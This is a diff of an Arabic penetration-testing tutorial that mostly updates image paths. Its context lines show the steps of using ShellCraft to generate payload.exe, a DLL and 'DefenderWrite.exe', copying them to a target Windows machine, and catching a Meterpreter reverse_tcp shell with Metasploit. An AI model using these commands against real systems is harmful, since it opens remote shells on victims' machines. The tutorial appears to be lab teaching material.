@@ -17,7 +17,7 @@
 ```
 git clone https://github.com/HackScaleTeam/ShellCraft
 ```
- ![install](shell_img/IMG_0271.png)
+ ![install](/assets/2.png)
 
 
 # الدخول إلى مجلد الأداة
@@ -26,7 +26,7 @@ git clone https://github.com/HackScaleTeam/ShellCraft
 ```
 cd ShellCraft
 ```
-![cd](shell_img/IMG_0272.png)
+![cd](/assets/3.png)
 
 ولعرض الملفات الموجودة داخل المجلد نستخدم الأمر:
 ```
@@ -45,7 +45,7 @@ chmod +x install.sh
 ```
 sudo ./install.sh
 ```
-![chmod](shell_img/IMG_0273.png)
+![chmod](/assets/4.png)
 
 
 # إنشاء Payload باستخدام ShellCraft
@@ -58,7 +58,7 @@ python3 shellcraft.py --msf 172.16.166.130 4444 -o payload.exe
 
 الخيار -o يعني تحديد اسم ملف الإخراج، وفي هذا المثال اخترنا الاسم payload.exe، ويمكنك اختيار أي اسم تريده.
 
-![exam](shell_img/IMG_0276.png)
+![exam](/assets/7.png)
 
 
 # الملفات التي سيتم إنشاؤها
@@ -69,10 +69,10 @@ payload.exe
 payload.dll
 DefenderWrite.exe
 ```
-![3](shell_img/IMG_0277.png)
+![3](/assets/8.png)
 
 بعد ذلك نقوم بنقل هذه الملفات إلى نظام ويندوز المستهدف.
-![exm](shell_img/IMG_0278.png)
+![exm](/assets/9.png)
 
 
 
@@ -82,9 +82,9 @@ DefenderWrite.exe
 
 نبدأ بتشغيل Metasploit :
 ```
-msfconsloe
+msfconsole
 ```
-![msf](shell_img/IMG_0279.png)
+![msf](/assets/10.png)
 
  ومن ثم تشغيل الامر التالي :
 ```
@@ -103,7 +103,7 @@ set payload windows/meterpreter/reverse_tcp
 set LHOST 172.16.166.130
 set LPORT 4444
 ```
-![msd](shell_img/IMG_0280.png)
+![msd](/assets/11.png)
 
 ## تشغيل الـ Payload على النظام المستهدف
 
@@ -115,7 +115,7 @@ payload.exe
 
 ⚠️ تأكد من أن الملفات الثلاثة موجودة في نفس المجلد.
 
-![win](shell_img/IMG_0281.png)
+![win](/assets/12.png)
 
 
 # الحصول على Meterpreter Session
@@ -124,10 +124,10 @@ payload.exe
 
 كما نرى في الصورة التالية، تم الحصول على Reverse Connection بنجاح وفتح Meterpreter session.
 
-![r](shell_img/IMG_0282.png)
+![r](/assets/13.png)
 
 نشغل الامر sysinfo لمعرفة تفاصيل النظام :
-![e](shell_img/IMG_0283.png)
+![e](/assets/14.png)
 
 
 # الخاتمة
